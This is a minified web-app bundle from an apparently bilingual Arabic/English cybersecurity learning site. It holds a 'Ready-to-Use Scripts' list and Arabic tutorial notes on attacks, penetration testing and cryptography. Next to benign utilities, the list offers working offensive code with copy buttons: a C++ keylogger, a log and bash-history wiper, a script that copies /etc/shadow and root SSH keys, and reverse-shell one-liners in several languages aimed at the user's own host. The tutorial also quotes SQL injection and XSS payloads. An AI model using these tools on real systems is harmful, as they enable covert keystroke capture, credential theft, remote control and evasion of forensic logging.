        print("[+] No suspicious keylogger processes detected")
    
    return suspicious

detect_keyloggers()`,
        },
        {
            name: { ar: "مولد كلمات المرور", en: "Password Generator" },
            description: { ar: "توليد كلمات مرور قوية", en: "Generate strong passwords" },
            language: "Python",
            code: `import random
import string

def generate_password(length=16, use_special=True):
    chars = string.ascii_letters + string.digits
    if use_special:
        chars += string.punctuation
    
    password = ''.join(random.SystemRandom().choice(chars) for _ in range(length))
    return password

def generate_wordlist(count=100, min_len=8, max_len=16):
    wordlist = []
    for _ in range(count):
        length = random.randint(min_len, max_len)
        wordlist.append(generate_password(length))
    return wordlist

# Generate 5 passwords
print("Generated Passwords:")
for i in range(5):
    print(f"  {i+1}. {generate_password(20)}")`,
        },
        {
            name: { ar: "مستخرج البريد الإلكتروني", en: "Email Extractor" },
            description: { ar: "استخراج الإيميلات من صفحات الويب", en: "Extract emails from web pages" },
            language: "Python",
            code: `import re
import requests
from bs4 import BeautifulSoup

def extract_emails(url):
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        text = soup.get_text()
        
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+.[a-zA-Z]{2,}'
        emails = set(re.findall(email_pattern, text))
        
        print(f"\\n[*] Found {len(emails)} emails on {url}:\\n")
        for email in sorted(emails):
            print(f"  {email}")
        
        return list(emails)
    except Exception as e:
        print(f"Error: {e}")
        return []

# Usage: extract_emails("https://example.com")`,
        },
        {
            name: { ar: "فاحص الروابط", en: "URL Checker" },
            description: { ar: "فحص حالة الروابط والسيرفرات", en: "Check URL and server status" },
            language: "Python",
            code: `import requests
import ssl
import socket

def check_url(url):
    print(f"\\n[*] Checking {url}...\\n")
    
    try:
        response = requests.get(url, timeout=10, allow_redirects=True)
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Final URL: {response.url}")
        print(f"[+] Server: {response.headers.get('Server', 'Unknown')}")
        print(f"[+] Content-Type: {response.headers.get('Content-Type', 'Unknown')}")
        
        # Check SSL
        if url.startswith('https'):
            hostname = url.split('/')[2]
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(socket.socket(), server_hostname=hostname) as s:
                s.connect((hostname, 443))
                cert = s.getpeercert()
                print(f"[+] SSL Valid Until: {cert['notAfter']}")
        
        return response.status_code
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

# Usage: check_url("https://google.com")`,
        },
        {
            name: { ar: "ماسح المنافذ (C++)", en: "Port Scanner (C++)" },
            description: { ar: "ماسح منافذ سريع بلغة C++", en: "Fast port scanner in C++" },
            language: "C++",
            code: `#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <thread>
#include <vector>

#pragma comment(lib, "ws2_32.lib")

void scan_port(const char* ip, int port) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return;
    
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    
    DWORD timeout = 1000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    
    if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
        std::cout << "[+] Port " << port << " is OPEN" << std::endl;
    }
    closesocket(sock);
}

int main() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    
    std::string target;
    std::cout << "Enter target IP: ";
    std::cin >> target;
    
    std::cout << "\\nScanning " << target << "...\\n" << std::endl;
    
    std::vector<std::thread> threads;
    for (int port = 1; port <= 1024; port++) {
        threads.emplace_back(scan_port, target.c_str(), port);
    }
    
    for (auto& t : threads) t.join();
    
    WSACleanup();
    return 0;
}`,
        },
        {
            name: { ar: "مولد كلمات المرور (C++)", en: "Password Generator (C++)" },
            description: { ar: "مولد كلمات مرور قوية", en: "Strong password generator" },
            language: "C++",
            code: `#include <iostream>
#include <string>
#include <random>
#include <ctime>

std::string generate_password(int length, bool upper, bool lower, 
                               bool digits, bool special) {
    std::string charset = "";
    if (upper)   charset += "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    if (lower)   charset += "abcdefghijklmnopqrstuvwxyz";
    if (digits)  charset += "0123456789";
    if (special) charset += "!@#$%^&*()_+-=[]{}|;:,.<>?";
    
    if (charset.empty()) {
        return "Error: No character set selected";
    }
    
    std::mt19937 rng(std::time(nullptr));
    std::uniform_int_distribution<int> dist(0, charset.length() - 1);
    
    std::string password = "";
    for (int i = 0; i < length; i++) {
        password += charset[dist(rng)];
    }
    
    return password;
}

int main() {
    int length;
    std::cout << "Password length: ";
    std::cin >> length;
    
    std::cout << "\\nGenerated passwords:\\n" << std::endl;
    
    for (int i = 0; i < 5; i++) {
        std::string pwd = generate_password(length, true, true, true, true);
        std::cout << "  " << i+1 << ". " << pwd << std::endl;
    }
    
    return 0;
}`,
        },
        {
            name: { ar: "مشفر الملفات (C++)", en: "File Encryptor (C++)" },
            description: { ar: "تشفير الملفات باستخدام XOR", en: "XOR file encryption" },
            language: "C++",
            code: `#include <iostream>
#include <fstream>
#include <string>
#include <vector>

void xor_encrypt(const std::string& input_file, 
                 const std::string& output_file,
                 const std::string& key) {
    std::ifstream in(input_file, std::ios::binary);
    std::ofstream out(output_file, std::ios::binary);
    
    if (!in.is_open() || !out.is_open()) {
        std::cerr << "Error opening files!" << std::endl;
        return;
    }
    
    char byte;
    size_t key_index = 0;
    
    while (in.get(byte)) {
        byte ^= key[key_index % key.length()];
        out.put(byte);
        key_index++;
    }
    
    in.close();
    out.close();
    
    std::cout << "[+] File encrypted successfully!" << std::endl;
    std::cout << "[*] Output: " << output_file << std::endl;
}

int main() {
    std::string input, output, key;
    
    std::cout << "Input file: ";
    std::cin >> input;
    
    std::cout << "Output file: ";
    std::cin >> output;
    
    std::cout << "Encryption key: ";
    std::cin >> key;
    
    xor_encrypt(input, output, key);
    
    return 0;
}`,
        },
        {
            name: { ar: "Keylogger بسيط (C++)", en: "Simple Keylogger (C++)" },
            description: { ar: "مسجل ضغطات لوحة المفاتيح للتعليم", en: "Educational keyboard logger" },
            language: "C++",
            code: `#include <iostream>
#include <fstream>
#include <windows.h>

// WARNING: For educational purposes only!
// Use only on systems you own or have permission to test.

std::string get_key_name(int key) {
    switch(key) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "[ENTER]\\n";
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_SHIFT: return "";
        case VK_CONTROL: return "[CTRL]";
        case VK_CAPITAL: return "[CAPS]";
        case VK_ESCAPE: return "[ESC]";
        default:
            if (key >= 0x30 && key <= 0x5A) {
                char c = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
                if (!(GetKeyState(VK_SHIFT) & 0x8000) && c >= 'A' && c <= 'Z')
                    c += 32; // lowercase
                return std::string(1, c);
            }
            return "";
    }
}

int main() {
    std::ofstream log("keylog.txt", std::ios::app);
    
    std::cout << "[*] Keylogger started (Press ESC to stop)" << std::endl;
    std::cout << "[*] Logging to keylog.txt" << std::endl;
    
    while (true) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                std::string output = get_key_name(key);
                if (!output.empty()) {
                    std::cout << output;
                    log << output;
                    log.flush();
                }
                if (key == VK_ESCAPE) {
                    log.close();
                    return 0;
                }
            }
        }
        Sleep(10);
    }
    return 0;
}`,
        },
        {
            name: { ar: "جامع معلومات النظام", en: "System Info Collector" },
            description: { ar: "جمع معلومات النظام", en: "Collect system information" },
            language: "Bash",
            code: `#!/bin/bash

echo "========================================="
echo "       SYSTEM INFORMATION COLLECTOR      "
echo "========================================="
echo ""

echo "[+] Hostname: $(hostname)"
echo "[+] User: $(whoami)"
echo "[+] OS: $(uname -a)"
echo ""

echo "[+] Network Interfaces:"
ip addr | grep -E "inet " | awk '{print "    " $2}'
echo ""

echo "[+] Open Ports:"
netstat -tuln 2>/dev/null | grep LISTEN | awk '{print "    " $4}'
echo ""

echo "[+] Running Services:"
systemctl list-units --type=service --state=running | head -20
echo ""

echo "[+] Last 5 Logins:"
last -5
echo ""

echo "[+] Disk Usage:"
df -h | grep -E "^/dev"
echo ""

echo "========================================="
echo "          Scan Complete                  "
echo "========================================="`,
        },
        {
            name: { ar: "نسخ احتياطي للجدار الناري", en: "Firewall Backup" },
            description: { ar: "نسخ احتياطي لقواعد الجدار الناري", en: "Backup firewall rules" },
            language: "Bash",
            code: `#!/bin/bash

BACKUP_DIR="/backup/firewall"
DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_FILE="$BACKUP_DIR/iptables_backup_$DATE.rules"

# Create backup directory
mkdir -p $BACKUP_DIR

echo "[*] Creating firewall rules backup..."

# Backup iptables rules
iptables-save > $BACKUP_FILE

if [ $? -eq 0 ]; then
    echo "[+] Backup created: $BACKUP_FILE"
    echo "[+] File size: $(ls -lh $BACKUP_FILE | awk '{print $5}')"
    
    # Keep only last 10 backups
    cd $BACKUP_DIR
    ls -t | tail -n +11 | xargs -r rm --
    echo "[+] Old backups cleaned"
else
    echo "[-] Backup failed!"
    exit 1
fi

echo ""
echo "[*] Current rules count:"
echo "    IPv4: $(iptables -L -n | grep -c '^')"
echo "    IPv6: $(ip6tables -L -n | grep -c '^')"`,
        },
        {
            name: { ar: "ماسح الشبكة (Bash)", en: "Network Scanner (Bash)" },
            description: { ar: "مسح الشبكة المحلية", en: "Scan local network" },
            language: "Bash",
            code: `#!/bin/bash

if [ -z "$1" ]; then
    echo "Usage: $0 <network> (e.g., 192.168.1)"
    exit 1
fi

NETWORK=$1

echo "========================================="
echo "       NETWORK SCANNER                   "
echo "========================================="
echo ""
echo "[*] Scanning network: $NETWORK.0/24"
echo ""

for ip in $(seq 1 254); do
    (
        ping -c 1 -W 1 $NETWORK.$ip &>/dev/null
        if [ $? -eq 0 ]; then
            echo "[+] Host found: $NETWORK.$ip"
            # Get hostname if possible
            hostname=$(host $NETWORK.$ip 2>/dev/null | grep "domain name pointer" | awk '{print $5}')
            if [ ! -z "$hostname" ]; then
                echo "    Hostname: $hostname"
            fi
        fi
    ) &
done

wait
echo ""
echo "[*] Scan complete"`,
        },
        {
            name: { ar: "مراقب العمليات", en: "Process Monitor" },
            description: { ar: "مراقبة العمليات المشبوهة", en: "Monitor suspicious processes" },
            language: "Bash",
            code: `#!/bin/bash

echo "========================================="
echo "       PROCESS MONITOR                   "
echo "========================================="

SUSPICIOUS=("nc" "ncat" "netcat" "python" "perl" "ruby" "bash -i" "sh -i")

echo ""
echo "[*] Checking for suspicious processes..."
echo ""

for proc in "\${SUSPICIOUS[@]}"; do
    result=$(ps aux | grep -i "$proc" | grep -v grep)
    if [ ! -z "$result" ]; then
        echo "[!] Suspicious process found: $proc"
        echo "$result" | while read line; do
            echo "    $line"
        done
        echo ""
    fi
done

echo ""
echo "[*] Network connections (ESTABLISHED):"
netstat -tunapl 2>/dev/null | grep ESTABLISHED | head -10

echo ""
echo "[*] Listening ports:"
netstat -tunapl 2>/dev/null | grep LISTEN | head -10

echo ""
echo "[*] Scan complete"`,
        },
        {
            name: { ar: "منظف السجلات", en: "Log Cleaner" },
            description: { ar: "تنظيف سجلات النظام", en: "Clean system logs" },
            language: "Bash",
            code: `#!/bin/bash

# WARNING: Use only on systems you own!
# For educational purposes only.

echo "========================================="
echo "       LOG CLEANER                       "
echo "========================================="

if [ "$(id -u)" -ne 0 ]; then
    echo "[-] This script must be run as root"
    exit 1
fi

LOG_FILES=(
    "/var/log/auth.log"
    "/var/log/syslog"
    "/var/log/messages"
    "/var/log/secure"
    "/var/log/wtmp"
    "/var/log/btmp"
    "/var/log/lastlog"
)

echo ""
echo "[*] Clearing log files..."

for log in "\${LOG_FILES[@]}"; do
    if [ -f "$log" ]; then
        echo -n > "$log" 2>/dev/null
        echo "[+] Cleared: $log"
    fi
done

# Clear bash history
echo "[+] Clearing bash history..."
history -c
cat /dev/null > ~/.bash_history

echo ""
echo "[*] Log cleanup complete"`,
        },
        {
            name: { ar: "مستخرج كلمات المرور", en: "Password Extractor" },
            description: { ar: "استخراج الهاشات من النظام", en: "Extract system hashes" },
            language: "Bash",
            code: `#!/bin/bash

# WARNING: Educational purposes only!
# Only use on systems you have permission to test.

echo "========================================="
echo "       PASSWORD HASH EXTRACTOR           "
echo "========================================="

if [ "$(id -u)" -ne 0 ]; then
    echo "[-] This script must be run as root"
    exit 1
fi

OUTPUT_DIR="./extracted_hashes"
mkdir -p $OUTPUT_DIR

echo ""
echo "[*] Extracting password information..."

# Extract /etc/passwd
if [ -f /etc/passwd ]; then
    cp /etc/passwd $OUTPUT_DIR/passwd.txt
    echo "[+] Copied /etc/passwd"
fi

# Extract /etc/shadow
if [ -f /etc/shadow ]; then
    cp /etc/shadow $OUTPUT_DIR/shadow.txt
    echo "[+] Copied /etc/shadow"
fi

# Create unshadow file for John
if [ -f $OUTPUT_DIR/passwd.txt ] && [ -f $OUTPUT_DIR/shadow.txt ]; then
    unshadow $OUTPUT_DIR/passwd.txt $OUTPUT_DIR/shadow.txt > $OUTPUT_DIR/unshadowed.txt 2>/dev/null
    echo "[+] Created unshadowed file"
fi

# Extract SSH keys
if [ -d /root/.ssh ]; then
    cp -r /root/.ssh $OUTPUT_DIR/root_ssh 2>/dev/null
    echo "[+] Copied root SSH keys"
fi

echo ""
echo "[*] Extraction complete. Files saved to: $OUTPUT_DIR"`,
        },
        {
            name: { ar: "Reverse Shell", en: "Reverse Shell" },
            description: { ar: "اتصال عكسي للتحكم عن بعد", en: "Reverse connection for remote control" },
            language: "Bash",
            code: `#!/bin/bash

# WARNING: Educational purposes only!
# Only use in authorized penetration testing.

echo "========================================="
echo "       REVERSE SHELL GENERATOR           "
echo "========================================="

echo ""
read -p "Enter your IP address: " LHOST
read -p "Enter your listening port: " LPORT

echo ""
echo "[*] Reverse Shell One-Liners:"
echo ""

echo "=== Bash ===" 
echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
echo ""

echo "=== Python ==="
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"
echo ""

echo "=== Netcat ==="
echo "nc -e /bin/sh $LHOST $LPORT"
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f"
echo ""

echo "=== PHP ==="
echo "php -r '$sock=fsockopen("$LHOST",$LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'"
echo ""

echo "=== Perl ==="
echo "perl -e 'use Socket;$i="$LHOST";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"
echo ""

echo "[*] Start listener with: nc -lvnp $LPORT"`,
        },
    ],
    nk = () => {
        const [e, t] = x.useState(null),
            [n, r] = x.useState("all"),
            [o, s] = x.useState("ar"),
            i = (d, p) => {
                navigator.clipboard.writeText(d), t(p), setTimeout(() => t(null), 2e3);
            },
            a = n === "all" ? si : si.filter((d) => d.language === n),
            l = (d) => {
                switch (d) {
                    case "Python":
                        return "bg-blue-500/20 text-blue-400 border-blue-500/30";
                    case "C++":
                        return "bg-purple-500/20 text-purple-400 border-purple-500/30";
                    case "Bash":
                        return "bg-green-500/20 text-green-400 border-green-500/30";
                    default:
                        return "bg-primary/20 text-primary border-primary/30";
                }
            },
            u = {
                title: o === "ar" ? "السكربتات الجاهزة" : "Ready-to-Use Scripts",
                subtitle:
                    o === "ar"
                        ? `${si.length} سكربت بلغات Python و C++ و Bash`
                        : `${si.length} scripts in Python, C++, and Bash`,
                all: o === "ar" ? "الكل" : "All",
            };
        return c.jsxs("div", {
            className: "min-h-screen bg-background",
            children: [
                c.jsx(wr, {}),
                c.jsx("main", {
                    className: "pt-24 pb-16",
                    children: c.jsxs("div", {
                        className: "container mx-auto px-4",
                        children: [
                            c.jsxs("div", {
                                className: "text-center mb-12",
                                children: [
                                    c.jsx("div", {
                                        className: "flex justify-center mb-6",
                                        children: c.jsx("div", {
                                            className: "cyber-icon-box",
                                            children: c.jsx(Mu, { className: "w-10 h-10 text-primary" }),
                                        }),
                                    }),
                                    c.jsxs("div", {
                                        className: "flex items-center justify-center gap-3 mb-4",
                                        children: [
                                            c.jsx("h1", {
                                                className: "text-4xl md:text-5xl font-bold text-primary text-glow",
                                                children: u.title,
                                            }),
                                            c.jsx("button", {
                                                onClick: () => s((d) => (d === "ar" ? "en" : "ar")),
                                                className:
                                                    "p-2 rounded-lg bg-secondary border border-border/50 hover:border-primary/50 transition-colors",
                                                children: c.jsx(Rs, { className: "w-5 h-5 text-muted-foreground" }),
                                            }),
                                        ],
                                    }),
                                    c.jsx("p", {
                                        className: "text-muted-foreground text-lg max-w-2xl mx-auto",
                                        children: u.subtitle,
                                    }),
                                ],
                            }),
                            c.jsx("div", {
                                className: "flex justify-center gap-3 mb-10 flex-wrap",
                                children: ["all", "Python", "C++", "Bash"].map((d) =>
                                    c.jsx(
                                        "button",
                                        {
                                            onClick: () => r(d),
                                            className: `px-6 py-2 rounded-xl transition-all ${n === d ? "bg-primary/20 text-primary border border-primary/50" : "bg-secondary text-muted-foreground border border-border/50 hover:border-primary/30"}`,
                                            children: d === "all" ? u.all : d,
                                        },
                                        d
                                    )
                                ),
                            }),
                            c.jsx("div", {
                                className: "max-w-4xl mx-auto space-y-6",
                                children: a.map((d, p) =>
                                    c.jsxs(
                                        "div",
                                        {
                                            className: "cyber-card overflow-hidden",
                                            children: [
                                                c.jsx("div", {
                                                    className: "p-6 border-b border-border/30",
                                                    children: c.jsxs("div", {
                                                        className: "flex items-center justify-between",
                                                        children: [
                                                            c.jsxs("div", {
                                                                children: [
                                                                    c.jsx("h3", {
                                                                        className:
                                                                            "text-xl font-bold text-primary mb-1",
                                                                        children: o === "ar" ? d.name.ar : d.name.en,
                                                                    }),
                                                                    c.jsx("p", {
                                                                        className: "text-muted-foreground text-sm",
                                                                        children:
                                                                            o === "ar"
                                                                                ? d.description.ar
                                                                                : d.description.en,
                                                                    }),
                                                                ],
                                                            }),
                                                            c.jsx("span", {
                                                                className: `px-3 py-1 rounded-lg text-sm font-medium border ${l(d.language)}`,
                                                                children: d.language,
                                                            }),
                                                        ],
                                                    }),
                                                }),
                                                c.jsxs("div", {
                                                    className: "relative",
                                                    children: [
                                                        c.jsx("button", {
                                                            onClick: () => i(d.code, p),
                                                            className:
                                                                "absolute top-4 left-4 p-2 rounded-lg bg-secondary border border-border/50 hover:border-primary/50 transition-all z-10",
                                                            children:
                                                                e === p
                                                                    ? c.jsx(Au, { className: "w-4 h-4 text-primary" })
                                                                    : c.jsx(Sa, {
                                                                          className: "w-4 h-4 text-muted-foreground",
                                                                      }),
                                                        }),
                                                        c.jsx("pre", {
                                                            className:
                                                                "p-6 pt-14 overflow-x-auto bg-background/50 text-sm",
                                                            children: c.jsx("code", {
                                                                className: "text-foreground font-mono",
                                                                dir: "ltr",
                                                                children: d.code,
                                                            }),
                                                        }),
                                                    ],
                                                }),
                                            ],
                                        },
                                        p
                                    )
                                ),
                            }),
                        ],
                    }),
                }),
                c.jsx(Sr, {}),
            ],
        });
    },
    tf = [
        {
            icon: fo,
            title: "أساسيات الأمن السيبراني",
            description: "تعرف على المفاهيم الأساسية والمبادئ الثلاثة للأمن السيبراني",
            subTopics: [
                {
                    title: "ما هو الأمن السيبراني؟",
                    content: [
                        "الأمن السيبراني هو مجموعة من التقنيات والممارسات المصممة لحماية الأنظمة والشبكات والبيانات من الهجمات الإلكترونية",
                        "يشمل حماية الأجهزة (Hardware) والبرمجيات (Software) والبيانات من الوصول غير المصرح به",
                        "الهدف الرئيسي هو ضمان سرية وسلامة وتوافر المعلومات (CIA Triad)",
                        "يتضمن عدة مجالات: أمن الشبكات، أمن التطبيقات، أمن المعلومات، التعافي من الكوارث",
                        "أصبح الأمن السيبراني ضرورة ملحة مع تزايد الاعتماد على التكنولوجيا في جميع جوانب الحياة",
                    ],
                },
                {
                    title: "مثلث CIA - السرية والنزاهة والتوافر",
                    content: [
                        "السرية (Confidentiality): ضمان وصول المعلومات للأشخاص المصرح لهم فقط باستخدام التشفير والتحكم في الوصول",
                        "النزاهة (Integrity): ضمان عدم تعديل البيانات بشكل غير مصرح به، باستخدام checksums وdigital signatures",
                        "التوافر (Availability): ضمان توفر المعلومات والخدمات عند الحاجة إليها مع حماية من هجمات DDoS",
                        "هذه المبادئ الثلاثة تشكل أساس أي استراتيجية أمنية ناجحة",
                        "التوازن بين هذه المبادئ مهم - زيادة الأمان قد تؤثر على سهولة الاستخدام",
                    ],
                },
                {
                    title: "أنواع التهديدات السيبرانية",
                    content: [
                        "البرمجيات الخبيثة (Malware): فيروسات، ديدان، تروجان، رانسوموير، سبايوير",
                        "هجمات التصيد (Phishing): رسائل مزيفة لخداع المستخدمين وسرقة بياناتهم",
                        "هجمات الهندسة الاجتماعية: استغلال العامل البشري للوصول للمعلومات",
                        "هجمات حجب الخدمة (DDoS): إغراق الخوادم بطلبات وهمية لتعطيلها",
                        "التهديدات الداخلية: موظفون ساخطون أو مهملون يشكلون خطراً على المؤسسة",
                        "التهديدات المتقدمة المستمرة (APT): هجمات معقدة تستهدف مؤسسات محددة لفترات طويلة",
                    ],
                },
                {
                    title: "طبقات الحماية (Defense in Depth)",
                    content: [
                        "الطبقة الفيزيائية: حماية الأجهزة والمراكز من الوصول غير المصرح به",
                        "طبقة الشبكة: جدران حماية، IDS/IPS، تجزئة الشبكة، VPN",
                        "طبقة التطبيقات: فحص المدخلات، إدارة الجلسات، التحقق من الصلاحيات",
                        "طبقة البيانات: التشفير، النسخ الاحتياطي، التحكم في الوصول",
                        "طبقة المستخدم: التوعية الأمنية، المصادقة الثنائية، سياسات كلمات المرور",
                        "الفكرة: إذا فشلت طبقة واحدة، تبقى طبقات أخرى للحماية",
                    ],
                },
            ],
        },
        {
            icon: ig,
            title: "أنواع الهجمات الإلكترونية",
            description: "تعلم أشهر أنواع الهجمات وكيفية عملها للحماية منها",
            subTopics: [
                {
                    title: "هجمات التصيد (Phishing)",
                    content: [
                        "Spear Phishing: تصيد موجه لشخص أو منظمة محددة مع معلومات مخصصة",
                        "Whaling: استهداف المدراء التنفيذيين والشخصيات المهمة",
                        "Clone Phishing: نسخ رسائل شرعية وتعديلها مع روابط خبيثة",
                        "Vishing: التصيد عبر المكالمات الهاتفية وانتحال هوية البنوك أو الشركات",
                        "Smishing: التصيد عبر رسائل SMS مع روابط ضارة",
                        "طرق الكشف: التحقق من عنوان المرسل، الروابط المشبوهة، الأخطاء الإملائية، الإلحاح غير المبرر",
                    ],
                },
                {
                    title: "هجمات حقن SQL (SQL Injection)",
                    content: [
                        "تعريف: إدخال أوامر SQL خبيثة عبر حقول الإدخال في التطبيقات",
                        "In-band SQLi: استخدام نفس القناة للهجوم واستخراج البيانات",
                        "Blind SQLi: لا تظهر النتائج مباشرة، يتم الاستدلال من سلوك التطبيق",
                        "Out-of-band SQLi: إرسال البيانات لخادم خارجي يتحكم به المهاجم",
                        "مثال بسيط: ' OR '1'='1 - يجعل الشرط صحيحاً دائماً",
                        "الحماية: استخدام Prepared Statements، التحقق من المدخلات، مبدأ أقل الصلاحيات",
                    ],
                },
                {
                    title: "هجمات XSS (Cross-Site Scripting)",
                    content: [
                        "Stored XSS: تخزين الكود الخبيث في قاعدة البيانات وتنفيذه لكل زائر",
                        "Reflected XSS: الكود في URL ويتم تنفيذه فور فتح الرابط",
                        "DOM-based XSS: تعديل DOM مباشرة دون مرور بالخادم",
                        "الخطورة: سرقة الجلسات (Session Hijacking)، تغيير المحتوى، نشر البرمجيات الخبيثة",
                        "الحماية: ترميز المخرجات (Output Encoding)، Content Security Policy، HTTP-Only Cookies",
                        "أمثلة: <script>alert('XSS')</script> أو <img src=x onerror=alert('XSS')>",
                    ],
                },
                {
                    title: "هجمات القوة الغاشمة (Brute Force)",
                    content: [
                        "Simple Brute Force: تجربة جميع الاحتمالات الممكنة بشكل منهجي",
                        "Dictionary Attack: استخدام قائمة كلمات شائعة ومعدلة",
                        "Hybrid Attack: دمج الطريقتين مع إضافة أرقام ورموز",
                        "Credential Stuffing: استخدام بيانات مسربة من اختراقات سابقة",
                        "الحماية: كلمات مرور قوية، تأخير بعد المحاولات الفاشلة، CAPTCHA، المصادقة الثنائية",
                        "أدوات شائعة: Hydra, John the Ripper, Hashcat",
                    ],
                },
                {
                    title: "هجمات Man-in-the-Middle (MITM)",
                    content: [
                        "ARP Spoofing: تزييف جداول ARP لاعتراض الاتصالات في الشبكة المحلية",
                        "DNS Spoofing: تزييف سجلات DNS لتوجيه المستخدمين لمواقع مزيفة",
                        "SSL Stripping: تحويل اتصال HTTPS لـ HTTP غير مشفر",
                        "Evil Twin: إنشاء نقطة وصول Wi-Fi مزيفة بنفس اسم شبكة شرعية",
                        "الخطورة: سرقة بيانات الدخول، حقن محتوى خبيث، التجسس على الاتصالات",
                        "الحماية: استخدام HTTPS، VPN، عدم الاتصال بشبكات عامة غير موثوقة",
                    ],
                },
            ],
        },
        {
            icon: Gi,
            title: "اختبار الاختراق (Penetration Testing)",
            description: "تعرف على مراحل اختبار الاختراق الاحترافي والمنهجيات المعتمدة",
            subTopics: [
                {
                    title: "مراحل اختبار الاختراق",
                    content: [
                        "1. التخطيط والاستطلاع: تحديد النطاق، جمع المعلومات السلبي والنشط",
                        "2. المسح (Scanning): فحص المنافذ، اكتشاف الخدمات، تحديد نقاط الضعف",
                        "3. الوصول (Gaining Access): استغلال الثغرات المكتشفة للحصول على وصول",
                        "4. الحفاظ على الوصول: تثبيت backdoors، رفع الصلاحيات",
                        "5. التغطية: إزالة الآثار وتنظيف السجلات (في الهجمات الحقيقية)",
                        "6. التقرير: توثيق جميع الثغرات مع توصيات الإصلاح ودرجة الخطورة",
                    ],
                },
                {
                    title: "أنواع اختبار الاختراق",
                    content: [
                        "Black Box: لا معلومات مسبقة - يحاكي هجوم خارجي حقيقي",
                        "White Box: معلومات كاملة عن الهدف - فحص شامل للكود والبنية",
                        "Gray Box: معلومات جزئية - يحاكي مهاجم داخلي أو شريك",
                        "Internal Testing: اختبار من داخل الشبكة كموظف",
                        "External Testing: اختبار من خارج الشبكة كمهاجم خارجي",
                        "Social Engineering Testing: اختبار مقاومة الموظفين للتصيد والخداع",
                    ],
                },
                {
                    title: "منهجيات اختبار الاختراق",
                    content: [
                        "OWASP Testing Guide: دليل شامل لاختبار تطبيقات الويب",
                        "PTES (Penetration Testing Execution Standard): معيار شامل لاختبار الاختراق",
                        "OSSTMM (Open Source Security Testing Methodology Manual): منهجية مفتوحة المصدر",
                        "NIST SP 800-115: إرشادات المعهد الوطني للمعايير والتكنولوجيا",
                        "ISSAF (Information Systems Security Assessment Framework): إطار تقييم شامل",
                        "اختيار المنهجية يعتمد على نوع الهدف ومتطلبات العميل",
                    ],
                },
                {
                    title: "الاستطلاع وجمع المعلومات",
                    content: [
                        "Passive Reconnaissance: جمع معلومات بدون التفاعل مع الهدف (OSINT)",
                        "أدوات: Google Dorks، Shodan، theHarvester، Maltego، WHOIS",
                        "Active Reconnaissance: فحص مباشر للهدف قد يتم اكتشافه",
                        "أدوات: Nmap، Nikto، Dirb/Gobuster، DNS enumeration",
                        "المعلومات المطلوبة: عناوين IP، أسماء النطاقات الفرعية، التقنيات المستخدمة، الموظفين",
                        "تذكر: الاستطلاع الجيد هو 80% من نجاح اختبار الاختراق",
                    ],
                },
            ],
        },
        {
            icon: vc,
            title: "التشفير والحماية",
            description: "أساسيات التشفير وأنواعه وكيفية استخدامه لحماية البيانات",
            subTopics: [
                {
                    title: "أنواع التشفير",
                    content: [
                        "التشفير المتماثل (Symmetric): مفتاح واحد للتشفير وفك التشفير",
                        "خوارزميات: AES (الأكثر استخداماً)، DES (قديم وضعيف)، 3DES، Blowfish",
                        "التشفير غير المتماثل (Asymmetric): مفتاح عام للتشفير وخاص لفك التشفير",
                        "خوارزميات: RSA، ECC (أسرع وأقوى)، DSA، ElGamal",
                        "التشفير المختلط: استخدام كلا النوعين معاً (مثل TLS)",
                        "المفتاح العام يمكن مشاركته، المفتاح الخاص يجب حمايته بشكل مطلق",
                    ],
                },
                {
                    title: "دوال الهاش (Hashing)",
                    content: [
                        "تعريف: تحويل أي بيانات لقيمة ثابتة الطول (بصمة رقمية)",
                        "خصائص: أحادية الاتجاه، تغيير بسيط ينتج هاش مختلف تماماً",
                        "MD5: 128-bit، سريع لكن ضعيف (collisions معروفة)",
                        "SHA-1: 160-bit، أفضل من MD5 لكن أصبح ضعيفاً أيضاً",
                        "SHA-256/512: آمن ومستخدم حالياً في معظم التطبيقات",
                        "bcrypt/Argon2: مصممة خصيصاً لكلمات المرور مع salt",
                    ],
                },
                {
                    title: "البروتوكولات الآمنة",
                    content: [
                        "TLS/SSL: تأمين اتصالات الويب (HTTPS) ومعظم البروتوكولات",
                        "SSH: Secure Shell للوصول الآمن للخوادم ونقل الملفات",
                        "SFTP/SCP: نقل ملفات آمن عبر SSH",
                        "IPsec: تأمين اتصالات الشبكة على مستوى IP (VPN)",
                        "WPA3: أحدث معيار لتأمين شبكات Wi-Fi",
                        "PGP/GPG: تشفير البريد الإلكتروني والملفات",
                    ],
                },
                {
                    title: "إدارة المفاتيح والشهادات",
                    content: [
                        "الشهادات الرقمية: إثبات هوية المواقع والخدمات (X.509)",
                        "Certificate Authority (CA): جهة موثوقة تصدر الشهادات",
